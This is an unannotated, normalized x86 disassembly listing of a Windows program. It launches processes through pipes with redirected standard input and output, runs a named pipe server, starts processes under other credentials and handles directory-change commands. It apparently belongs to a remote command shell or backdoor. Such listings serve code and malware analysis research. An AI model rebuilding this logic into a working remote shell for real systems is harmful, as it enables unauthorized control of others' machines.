add esp 0xc
lea edx [ esp + 0x8 ]
push edx
lea eax [ esp + 0x1c ]
push eax
push ebx
push ebx
push ebx
lea ecx [ esp + 0x474 ]
push ecx
push ebx
push ebx
lea edx [ esp + 0x880 ]
push edx
lea eax [ esp + 0x684 ]
push eax
lea ecx [ esp + 0xa88 ]
push ecx
mov [ esp + 0x44 ] 0x44
call [ CreateProcessWithLogonW@IAT ]
test eax eax
je r-xdata
push 0xc
push r--data
mov edx [ esp + 0x8 ]
mov esi [ CloseHandle@IAT ]
push edx
call esi
mov eax [ esp + 0xc ]
push eax
call esi
push 0xe
push r--data
jmp r-xdata
mov ecx rw-data
call sub_409850
mov ecx [ esp + 0xc64 ]
pop esi
pop ebx
xor ecx esp
mov eax 0x1
call sub_40e1e0
add esp 0xc64
retn
sub_4060f0
sub esp 0x468
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x460 ] eax
push esi
push 0x3ff
lea eax [ esp + 0x65 ]
push 0x0
push eax
mov esi ecx
mov [ esp + 0x6c ] 0x0
call sub_414890
lea ecx [ esp + 0x6c ]
push 0xffffffec
push ecx
mov edx r--data
mov ecx esi
call sub_404ff0
push 0x44
lea edx [ esp + 0x30 ]
push 0x0
push edx
call sub_414890
add esp 0x20
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x1
push 0x0
push 0x0
lea edx [ esp + 0x80 ]
push edx
push 0x0
mov [ esp + 0x40 ] 0x44
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
push 0xc
push r--data
mov eax [ esp + 0xc ]
mov esi [ CloseHandle@IAT ]
push eax
call esi
mov ecx [ esp + 0x8 ]
push ecx
call esi
push 0xd
push r--data
jmp r-xdata
mov ecx rw-data
call sub_409850
mov ecx [ esp + 0x464 ]
pop esi
xor ecx esp
mov eax 0x1
call sub_40e1e0
add esp 0x468
retn
sub_4061d0
sub esp 0x2c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x24 ] eax
xor eax eax
mov [ esp + 0x14 ] al
mov [ esp + 0x15 ] eax
mov [ esp + 0x19 ] eax
mov [ esp + 0x1d ] eax
mov [ esp + 0x21 ] ax
mov [ esp + 0x23 ] al
lea eax [ esp + 0x14 ]
push 0xffffffec
push eax
mov edx r--data
call sub_404ff0
lea ecx [ esp + 0x1c ]
push ecx
call sub_40f92c
fld [ r--data ]
fnstcw [ esp + 0x12 ]
add esp 0xc
movzx eax [ esp + 0x6 ]
fmul st1
or eax 0xc00
mov [ esp + 0x8 ] eax
mov eax [ rw-data ]
fmulp st1
push eax
fldcw [ esp + 0xc ]
mov [ rw-data ] 0x13
fistp [ esp + 0xc ]
mov edx [ esp + 0xc ]
mov [ rw-data ] edx
fldcw [ esp + 0xa ]
call [ SetEvent@IAT ]
mov ecx [ esp + 0x24 ]
xor ecx esp
mov eax 0x1
call sub_40e1e0
add esp 0x2c
retn
sub_406280
sub esp 0x33c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x334 ] eax
xor eax eax
push ebx
push esi
xor ebx ebx
mov [ esp + 0x79 ] eax
mov [ esp + 0x7d ] eax
mov [ esp + 0x81 ] eax
mov [ esp + 0x85 ] eax
mov [ esp + 0x89 ] eax
mov [ esp + 0x8d ] eax
mov [ esp + 0x91 ] eax
mov [ esp + 0x95 ] ax
mov [ esp + 0x97 ] al
mov [ esp + 0x59 ] eax
mov [ esp + 0x5d ] eax
mov [ esp + 0x61 ] eax
mov [ esp + 0x65 ] eax
mov [ esp + 0x69 ] eax
mov [ esp + 0x6d ] eax
mov [ esp + 0x71 ] eax
mov [ esp + 0x75 ] ax
mov [ esp + 0x77 ] al
mov [ esp + 0x99 ] eax
mov [ esp + 0x9d ] eax
mov [ esp + 0xa1 ] eax
mov [ esp + 0xa5 ] eax
mov [ esp + 0xa9 ] eax
mov [ esp + 0xad ] eax
mov [ esp + 0xb1 ] eax
mov [ esp + 0xb5 ] ax
mov [ esp + 0xb7 ] al
mov [ esp + 0x39 ] eax
mov [ esp + 0x3d ] eax
mov [ esp + 0x41 ] eax
mov [ esp + 0x45 ] eax
mov [ esp + 0x49 ] eax
mov [ esp + 0x4d ] eax
mov [ esp + 0x51 ] eax
mov [ esp + 0x55 ] ax
mov [ esp + 0x57 ] al
lea eax [ esp + 0x78 ]
push 0xffffffec
push eax
mov edx r--data
mov esi ecx
mov [ esp + 0x80 ] bl
mov [ esp + 0x60 ] bl
mov [ esp + 0xa0 ] bl
mov [ esp + 0x40 ] bl
call sub_404ff0
lea ecx [ esp + 0x60 ]
push 0xffffffec
push ecx
mov edx r--data
mov ecx esi
call sub_404ff0
lea edx [ esp + 0xa8 ]
push 0xffffffec
push edx
mov edx r--data
mov ecx esi
call sub_404ff0
lea eax [ esp + 0x50 ]
push 0xffffffec
push eax
mov edx r--data
mov ecx esi
call sub_404ff0
xor eax eax
lea ecx [ esp + 0x98 ]
push ecx
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] eax
mov [ esp + 0x4c ] eax
mov [ esp + 0x50 ] eax
call sub_40e9c3
lea edx [ esp + 0x7c ]
sub eax 0x76c
push edx
mov [ esp + 0x48 ] eax
call sub_40e9c3
dec eax
mov [ esp + 0x44 ] eax
lea eax [ esp + 0xc0 ]
push eax
call sub_40e9c3
lea ecx [ esp + 0x64 ]
push ecx
mov [ esp + 0x48 ] eax
call sub_40e9c3
lea edx [ esp + 0x3c ]
push edx
mov [ esp + 0x48 ] eax
call sub_40e57e
push 0x7f
mov esi eax
lea eax [ esp + 0xf1 ]
push ebx
push eax
mov [ esp + 0x74 ] edx
mov [ esp + 0xf8 ] bl
call sub_414890
add esp 0x40
push 0xff
lea ecx [ esp + 0x23d ]
push ebx
push ecx
mov [ esp + 0x244 ] bl
call sub_414890
push 0xff
lea edx [ esp + 0x149 ]
push ebx
push edx
mov [ esp + 0x150 ] bl
call sub_414890
add esp 0x18
push 0xff
lea eax [ esp + 0x23c ]
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
push ebx
push ebx
lea ecx [ esp + 0x140 ]
push ecx
lea edx [ esp + 0x244 ]
push ebx
push edx
call sub_40fb82
lea eax [ esp + 0x14c ]
add esp 0x14
dec eax
mov cl [ eax + 0x1 ]
inc eax
cmp cl bl
jne r-xdata
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
mov cx [ r--data ]
mov [ eax + 0x4 ] edx
push 0xa
lea edx [ esp + 0xbc ]
push edx
push esi
mov [ eax + 0x8 ] cx
call sub_420502
add esp 0xc
lea eax [ esp + 0x138 ]
push eax
lea ecx [ esp + 0xbc ]
push ecx
push r--data
push r--data
call [ WritePrivateProfileStringA@IAT ]
push 0x39
push r--data
mov ecx rw-data
call sub_409850
mov ecx [ esp + 0x33c ]
pop esi
pop ebx
xor ecx esp
mov eax 0x1
call sub_40e1e0
add esp 0x33c
retn
sub_406550
push 0x100
push 0x0
push rw-data
call sub_414890
push 0x100
push 0x0
push rw-data
call sub_414890
mov eax [ rw-data ]
add esp 0x18
test eax eax
je r-xdata
push 0xffffffec
push rw-data
mov edx r--data
mov ecx esi
call sub_404ff0
push 0xffffffec
push rw-data
mov edx r--data
mov ecx esi
call sub_404ff0
push 0x0
push 0x0
push 0x0
push sub_403a90
push 0x0
push 0x0
call sub_40ec0d
add esp 0x28
mov [ rw-data ] eax
test eax eax
jne r-xdata
push 0xfa0
push eax
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
mov eax 0x1
retn
push 0x1d
push r--data
mov ecx rw-data
call sub_409850
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push 0x0
push eax
call [ TerminateThread@IAT ]
sub_406610
sub esp 0x274
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x26c ] eax
push ebx
push esi
xor ebx ebx
push 0x1ff
lea eax [ esp + 0x75 ]
push ebx
push eax
mov [ esp + 0x7c ] bl
call sub_414890
add esp 0xc
push 0x200
lea ecx [ esp + 0x74 ]
push ecx
call [ GetSystemDirectoryA@IAT ]
lea eax [ esp + 0x70 ]
dec eax
mov cl [ eax + 0x1 ]
inc eax
cmp cl bl
jne r-xdata
mov edx [ r--data ]
mov ecx [ r--data ]
mov [ eax ] edx
mov dl [ r--data ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] dl
call sub_407480
mov esi [ CreatePipe@IAT ]
push ebx
lea eax [ esp + 0x10 ]
push eax
push rw-data
push rw-data
mov [ esp + 0x1c ] 0xc
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] 0x1
call esi
push ebx
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
push rw-data
call esi
lea edx [ esp + 0x18 ]
push edx
call [ GetStartupInfoA@IAT ]
mov edx [ rw-data ]
xor eax eax
mov [ esp + 0x48 ] ax
mov eax [ rw-data ]
xor ecx ecx
mov [ esp + 0x54 ] eax
mov [ esp + 0x58 ] eax
lea eax [ esp + 0x60 ]
push eax
mov [ esp + 0x4e ] cx
lea ecx [ esp + 0x1c ]
push ecx
push ebx
push ebx
push ebx
push 0x1
push ebx
mov [ esp + 0x6c ] edx
push ebx
lea edx [ esp + 0x90 ]
push edx
push ebx
mov [ esp + 0x40 ] 0x44
mov [ esp + 0x44 ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x5c ] ebx
mov [ esp + 0x58 ] ebx
mov [ esp + 0x54 ] ebx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x74 ] ebx
mov [ esp + 0x6c ] 0x101
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
push 0x17
push r--data
mov ecx rw-data
call sub_409850
mov ecx [ esp + 0x64 ]
mov eax [ esp + 0x60 ]
push ecx
mov [ rw-data ] eax
call [ CloseHandle@IAT ]
push 0x64
call [ Sleep@IAT ]
push ebx
push ebx
push ebx
push sub_4038c0
push ebx
push ebx
call sub_40ec0d
add esp 0x18
mov [ rw-data ] eax
jmp r-xdata
mov ecx [ esp + 0x274 ]
pop esi
pop ebx
xor ecx esp
mov eax 0x1
call sub_40e1e0
add esp 0x274
retn
sub_4067a0
push 0xffffffff
push sub_420c91
mov eax [ fs : 0x0 ]
push eax
sub esp 0x148
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x144 ] eax
push ebx
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x150 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push 0x103
lea eax [ esp + 0x49 ]
push ebx
push eax
mov [ esp + 0x50 ] bl
call sub_414890
add esp 0xc
lea ecx [ esp + 0x44 ]
push ecx
push 0x104
call [ GetCurrentDirectoryA@IAT ]
test eax eax
jne r-xdata
push rw-data
call [ EnterCriticalSection@IAT ]
push 0x1
push r--data
lea ecx [ esp + 0x14 ]
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] ebx
mov [ esp + 0x18 ] bl
call sub_409850
lea edx [ esp + 0xc ]
push edx
mov [ esp + 0x15c ] ebx
call sub_408f40
mov [ esp + 0x158 ] 0xffffffff
cmp [ esp + 0x24 ] 0x10
jb r-xdata
push 0x1d
push r--data
mov ecx rw-data
call sub_409850
jmp r-xdata
lea eax [ esp + 0x44 ]
mov [ esp + 0x24 ] 0xf
mov [ esp + 0x20 ] ebx
mov [ esp + 0x10 ] bl
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov eax [ esp + 0x10 ]
push eax
call sub_40f2fb
add esp 0x4
mov eax 0x1
mov ecx [ esp + 0x150 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov ecx [ esp + 0x144 ]
xor ecx esp
call sub_40e1e0
add esp 0x154
retn
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x48 ]
push ecx
lea ecx [ esp + 0x14 ]
call sub_409850
lea edx [ esp + 0xc ]
push edx
mov [ esp + 0x15c ] 0x1
call sub_408f40
mov [ esp + 0x158 ] 0xffffffff
cmp [ esp + 0x24 ] 0x10
jb r-xdata
push 0x1
push r--data
lea ecx [ esp + 0x30 ]
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
call sub_409850
lea ecx [ esp + 0x28 ]
push ecx
mov [ esp + 0x15c ] 0x2
call sub_408f40
cmp [ esp + 0x40 ] 0x10
jb r-xdata
mov eax [ esp + 0x10 ]
push eax
call sub_40f2fb
add esp 0x4
push rw-data
call [ LeaveCriticalSection@IAT ]
mov edx [ esp + 0x2c ]
push edx
call sub_40f2fb
add esp 0x4
sub_406960
push 0xffffffff
push sub_421001
mov eax [ fs : 0x0 ]
push eax
mov eax 0x285c
call sub_41c2a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2858 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2870 ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov ebp [ CloseHandle@IAT ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push eax
call [ DisconnectNamedPipe@IAT ]
mov eax [ rw-data ]
push eax
call ebp
mov [ rw-data ] ebx
push ebx
push ebx
push 0x800
push 0x800
push 0xff
push 0x6
push 0xc0000003
push r--data
call [ CreateNamedPipeA@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
jne r-xdata
push eax
call ebp
mov [ rw-data ] ebx
push ebx
push ebx
push 0x1
push ebx
call [ CreateEventA@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0x34 ]
push ecx
push edx
mov [ esp + 0x4c ] eax
call [ ConnectNamedPipe@IAT ]
test eax eax
jne r-xdata
push 0x18
push r--data
mov ecx rw-data
call sub_409850
jmp r-xdata
mov eax [ esp + 0x44 ]
push eax
call ebp
mov edi [ GetLastError@IAT ]
call edi
mov esi eax
cmp esi 0x3e5
jne r-xdata
mov eax 0x1
mov ecx [ esp + 0x2870 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x2858 ]
xor ecx esp
call sub_40e1e0
add esp 0x2868
retn
push 0x3ff
lea ecx [ esp + 0x2471 ]
push ebx
push ecx
mov [ esp + 0x2478 ] bl
call sub_414890
add esp 0xc
push esi
lea edx [ esp + 0x2470 ]
push r--data
push edx
call sub_40e24c
add esp 0xc
push rw-data
call [ EnterCriticalSection@IAT ]
lea eax [ esp + 0x246c ]
push eax
lea ecx [ esp + 0x4c ]
call sub_408300
lea ecx [ esp + 0x48 ]
push ecx
mov [ esp + 0x287c ] 0x2
call sub_408f40
cmp [ esp + 0x60 ] 0x10
jb r-xdata
mov eax [ esp + 0x44 ]
push 0x2710
push eax
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov [ rw-data ] ebx
mov edx [ esp + 0x4c ]
push edx
call sub_40f2fb
add esp 0x4
push 0x2008
lea edx [ esp + 0x68 ]
push ebx
push edx
mov [ esp + 0x20 ] ebx
call sub_414890
mov edx [ rw-data ]
add esp 0xc
push ebx
lea eax [ esp + 0x18 ]
push eax
push 0x400
lea ecx [ esp + 0x70 ]
push ecx
push edx
mov [ esp + 0x78 ] 0x13
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
push 0x3ff
lea ecx [ esp + 0x2071 ]
push ebx
push ecx
mov [ esp + 0x2078 ] bl
call sub_414890
add esp 0xc
lea edx [ esp + 0x206c ]
push r--data
push edx
call sub_40e24c
add esp 0x8
push rw-data
call [ EnterCriticalSection@IAT ]
lea eax [ esp + 0x206c ]
push eax
lea ecx [ esp + 0x1c ]
call sub_408300
lea ecx [ esp + 0x18 ]
mov [ esp + 0x2878 ] ebx
push ecx
push ebx
push ebx
push ebx
push sub_403c10
push ebx
push ebx
call sub_40ec0d
add esp 0x18
mov [ rw-data ] eax
jmp r-xdata
push 0x3ff
lea eax [ esp + 0x2071 ]
push ebx
push eax
mov [ esp + 0x2078 ] bl
call sub_414890
add esp 0xc
call edi
push eax
lea ecx [ esp + 0x2070 ]
push r--data
push ecx
call sub_40e24c
add esp 0xc
push rw-data
call [ EnterCriticalSection@IAT ]
lea edx [ esp + 0x206c ]
push edx
lea ecx [ esp + 0x1c ]
call sub_408300
lea eax [ esp + 0x18 ]
mov [ esp + 0x2878 ] 0x1
push eax
jmp r-xdata
call sub_408f40
lea ecx [ esp + 0x18 ]
call sub_408370
push rw-data
call [ LeaveCriticalSection@IAT ]
call sub_407520
jmp r-xdata
sub_406c70
sub esp 0x208
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x204 ] eax
push 0x1ff
lea eax [ esp + 0x9 ]
push 0x0
push eax
mov [ esp + 0x10 ] 0x0
call sub_414890
lea ecx [ esp + 0x10 ]
push 0xffffffec
push ecx
mov edx r--data
mov ecx esi
call sub_404ff0
lea eax [ esp + 0x18 ]
add esp 0x14
mov [ esp ] 0x0
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ rw-data ]
sub eax edx
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
lea eax [ esp + 0x10 ]
push eax
push ecx
call [ WriteFile@IAT ]
push 0x4
lea edx [ esp + 0x8 ]
push r--data
push edx
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ esp + 0x204 ]
xor ecx esp
mov eax 0x1
call sub_40e1e0
add esp 0x208
retn
mov eax [ rw-data ]
push eax
call [ SetEvent@IAT ]
push 0x3e8
call [ Sleep@IAT ]
call sub_407480
sub_406d40
push 0xffffffff
push sub_420fb1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xdac
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xda8 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xdc0 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push 0x3ff
lea eax [ esp + 0x1c1 ]
push ebx
push eax
mov esi ecx
mov [ esp + 0x1c8 ] bl
call sub_414890
add esp 0xc
lea ecx [ esp + 0x1bc ]
push 0xffffffec
push ecx
mov edx r--data
mov ecx esi
call sub_404ff0
movsx edx [ esp + 0x1c4 ]
push edx
call sub_40ef5b
add esp 0xc
test eax eax
je r-xdata
push 0x2
lea ecx [ esp + 0x1c0 ]
push r--data
push ecx
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
cmp [ esp + 0x1bd ] 0x3a
jne r-xdata
push 0x44
lea ecx [ esp + 0x50 ]
push ebx
push ecx
call sub_414890
mov esi [ CreatePipe@IAT ]
xor eax eax
add esp 0xc
push ebx
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] eax
lea edx [ esp + 0x40 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] eax
push edx
lea eax [ esp + 0x50 ]
push eax
lea ecx [ esp + 0x44 ]
push ecx
mov [ esp + 0x4c ] 0xc
mov [ esp + 0x50 ] ebx
mov [ esp + 0x54 ] 0x1
call esi
push ebx
lea edx [ esp + 0x40 ]
push edx
lea eax [ esp + 0x3c ]
push eax
lea ecx [ esp + 0x20 ]
push ecx
call esi
lea edx [ esp + 0x4c ]
push edx
call [ GetStartupInfoA@IAT ]
mov edx [ esp + 0x38 ]
xor eax eax
mov [ esp + 0x7c ] ax
mov eax [ esp + 0x34 ]
push 0x7ff
mov [ esp + 0x8c ] eax
mov [ esp + 0x90 ] eax
lea eax [ esp + 0x5c1 ]
xor ecx ecx
push ebx
push eax
mov [ esp + 0x58 ] 0x44
mov [ esp + 0x5c ] ebx
mov [ esp + 0x64 ] ebx
mov [ esp + 0x60 ] ebx
mov [ esp + 0x74 ] ebx
mov [ esp + 0x70 ] ebx
mov [ esp + 0x6c ] ebx
mov [ esp + 0x68 ] ebx
mov [ esp + 0x8c ] ebx
mov [ esp + 0x8a ] cx
mov [ esp + 0x84 ] 0x101
mov [ esp + 0x90 ] edx
mov [ esp + 0x5c8 ] bl
call sub_414890
lea eax [ esp + 0x5c8 ]
add esp 0xc
dec eax
mov edi edi
lea eax [ esp + 0x1bc ]
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
lea eax [ esp + 0x1bc ]
push eax
call [ SetCurrentDirectoryA@IAT ]
jmp r-xdata
mov cl [ eax + 0x1 ]
inc eax
cmp cl bl
jne r-xdata
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
mov ecx [ r--data ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
lea eax [ esp + 0x1bc ]
mov edx eax
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
cmp eax 0x2
jbe r-xdata
push 0x103
lea ecx [ esp + 0xb9 ]
push ebx
push ecx
mov [ esp + 0xc0 ] bl
call sub_414890
add esp 0xc
lea edx [ esp + 0xb4 ]
push edx
push 0x104
call [ GetCurrentDirectoryA@IAT ]
push rw-data
call [ EnterCriticalSection@IAT ]
push 0x1
mov esi 0xf
push r--data
lea ecx [ esp + 0x20 ]
mov [ esp + 0x38 ] esi
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] bl
call sub_409850
lea eax [ esp + 0x18 ]
push eax
mov [ esp + 0xdcc ] ebx
call sub_408f40
or ebp 0xffffffff
mov edi 0x10
mov [ esp + 0xdc8 ] ebp
cmp [ esp + 0x30 ] edi
jb r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
mov al [ esp + 0x1be ]
cmp al 0x2e
je r-xdata
lea eax [ esp + 0xb4 ]
mov [ esp + 0x30 ] esi
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov ecx [ esp + 0x1c ]
push ecx
call sub_40f2fb
add esp 0x4
lea edi [ esp + 0x5bc ]
sub eax edx
dec edi
lea eax [ esp + 0x1be ]
push eax
call [ SetCurrentDirectoryA@IAT ]
jmp r-xdata
cmp al 0x5c
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0xb8 ]
push edx
lea ecx [ esp + 0x20 ]
call sub_409850
lea eax [ esp + 0x18 ]
push eax
mov [ esp + 0xdcc ] 0x1
call sub_408f40
mov [ esp + 0xdc8 ] ebp
cmp [ esp + 0x30 ] edi
jb r-xdata
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
lea edx [ esp + 0x18 ]
push edx
lea eax [ esp + 0x50 ]
push eax
push ebx
push ebx
push 0x10
push 0x1
and ecx 0x3
push ebx
[ edi ] [ esi ]
push ebx
lea ecx [ esp + 0x5dc ]
push ecx
push ebx
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
cmp al 0x9
je r-xdata
push 0x1
push r--data
lea ecx [ esp + 0xa0 ]
mov [ esp + 0xb8 ] esi
mov [ esp + 0xb4 ] ebx
mov [ esp + 0xa4 ] bl
call sub_409850
lea edx [ esp + 0x98 ]
push edx
mov [ esp + 0xdcc ] 0x2
call sub_408f40
cmp [ esp + 0xb0 ] edi
jb r-xdata
mov ecx [ esp + 0x1c ]
push ecx
call sub_40f2fb
add esp 0x4
mov eax [ esp + 0x38 ]
mov esi [ CloseHandle@IAT ]
push eax
call esi
mov ecx [ esp + 0x48 ]
push ecx
call esi
mov edx [ esp + 0x14 ]
push edx
call esi
mov eax [ esp + 0x34 ]
push eax
call esi
mov edx [ esp + 0x1c ]
push edx
call [ CloseHandle@IAT ]
mov ebp [ WaitForSingleObject@IAT ]
xor esi esi
lea eax [ esp + 0x1bc ]
mov esi 0x2
lea edx [ eax + 0x1 ]
cmp al 0x20
jne r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax 0x1
mov ecx [ esp + 0xdc0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0xda8 ]
xor ecx esp
call sub_40e1e0
add esp 0xdb8
retn
mov eax [ esp + 0x9c ]
push eax
call sub_40f2fb
add esp 0x4
call sub_405250
call sub_405250
inc esi
cmp esi 0xa
jl r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
cmp eax 0x2
jbe r-xdata
mov edx [ esp + 0x18 ]
push ebx
push edx
call [ TerminateProcess@IAT ]
mov eax [ esp + 0x18 ]
push 0xbb8
push eax
call ebp
mov edi [ esp + 0x14 ]
test eax eax
je r-xdata
jmp r-xdata
lea eax [ esp + 0x1bc ]
lea edx [ eax + 0x1 ]
mov al [ esp + esi + 0x1bc ]
cmp al 0x9
je r-xdata
mov ecx [ esp + 0x18 ]
push 0xbb8
push ecx
call ebp
cmp eax 0x102
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
cmp esi eax
jae r-xdata
lea eax [ esp + 0x1bc ]
inc esi
lea edx [ eax + 0x1 ]
lea esp [ esp ]
cmp al 0x20
jne r-xdata
lea edx [ esp + esi + 0x1bc ]
push edx
call [ SetCurrentDirectoryA@IAT ]
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
cmp esi eax
jb r-xdata
sub_407250
push 0xffffffff
push sub_420c3b
mov eax [ fs : 0x0 ]
push eax
mov eax 0x262c
call sub_41c2a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2628 ] eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2638 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push 0x1ff
lea eax [ esp + 0x2039 ]
push ebx
push eax
mov esi ecx
mov [ esp + 0x2040 ] bl
call sub_414890
add esp 0xc
lea ecx [ esp + 0x2034 ]
push 0xffffffec
push ecx
mov edx r--data
mov ecx esi
call sub_404ff0
push 0x2008
lea edx [ esp + 0x38 ]
push ebx
push edx
mov [ esp + 0x20 ] ebx
call sub_414890
lea eax [ esp + 0x2048 ]
add esp 0x14
mov [ esp + 0x2c ] 0x18
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x2038 ]
push eax
lea ecx [ esp + 0x3c ]
push ecx
call sub_4158c0
lea eax [ esp + 0x40 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
mov ecx [ rw-data ]
sub eax edx
push ebx
lea edx [ esp + 0x10 ]
push edx
add eax 0x20
push eax
lea eax [ esp + 0x38 ]
push eax
push ecx
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
push 0x4
lea ecx [ esp + 0x2038 ]
push r--data
push ecx
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
push 0x3ff
lea edx [ esp + 0x2239 ]
push ebx
push edx
mov [ esp + 0x2240 ] bl
call sub_414890
add esp 0xc
call [ GetLastError@IAT ]
push eax
lea eax [ esp + 0x2238 ]
push r--data
push eax
call sub_40e24c
add esp 0xc
push rw-data
call [ EnterCriticalSection@IAT ]
lea eax [ esp + 0x2234 ]
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
lea edx [ eax + 0x1 ]
mov eax 0x1
mov ecx [ esp + 0x2638 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ esp + 0x2628 ]
xor ecx esp
call sub_40e1e0
add esp 0x2638
retn
mov edx [ rw-data ]
push edx
call [ SetEvent@IAT ]
push 0x3e8
call [ Sleep@IAT ]
mov eax [ rw-data ]
mov esi [ CloseHandle@IAT ]
cmp eax ebx
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x2238 ]
push ecx
lea ecx [ esp + 0x18 ]
call sub_409850
lea edx [ esp + 0x10 ]
push edx
mov [ esp + 0x2644 ] ebx
call sub_408f40
cmp [ esp + 0x28 ] 0x10
jb r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push eax
call [ DisconnectNamedPipe@IAT ]
mov eax [ rw-data ]
push eax
call esi
mov [ rw-data ] ebx
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax [ esp + 0x14 ]
push eax
call sub_40f2fb
add esp 0x4
push eax
call esi
mov [ rw-data ] ebx
sub_407480
mov eax [ rw-data ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ rw-data ]
mov esi [ CloseHandle@IAT ]
cmp eax edi
je r-xdata
push edi
push eax
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov eax [ rw-data ]
push edi
push eax
call [ TerminateProcess@IAT ]
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
mov [ rw-data ] edi
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
mov [ rw-data ] edi
mov eax [ rw-data ]
